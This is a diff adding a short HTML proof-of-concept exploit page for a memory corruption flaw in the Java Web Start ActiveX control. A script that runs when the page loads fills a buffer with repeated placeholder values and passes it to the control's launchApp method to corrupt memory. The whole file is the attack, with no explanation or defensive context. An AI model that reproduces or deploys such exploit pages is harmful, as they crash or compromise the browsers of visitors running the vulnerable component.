@@ -1,0 +1,16 @@
+&lt;HTML&gt;
+&lt;HEAD&gt;
+&lt;TITLE&gt;Java ActiveX component memory corruption&lt;/TITLE&gt;
+&lt;/HEAD&gt;
+&lt;BODY&gt;
+&lt;OBJECT id=&#039;javaws&#039; classid=&#039;clsid:CAFEEFAC-DEC7-0000-0001-ABCDEFFEDCBA&#039;&gt;&lt;/object&gt;
+&lt;SCRIPT&gt;
+    function Exploit(){
+        var dword=unescape(&quot;%uAAAA%uBBBB&quot;);
+        for( mem = &quot;&quot;; mem.length&lt;0x2F; mem +=dword );
+        javaws.launchApp(mem,mem,mem);
+    }
+    Exploit();
+&lt;/SCRIPT&gt;
+&lt;/BODY&gt;
+&lt;/HTML&gt;
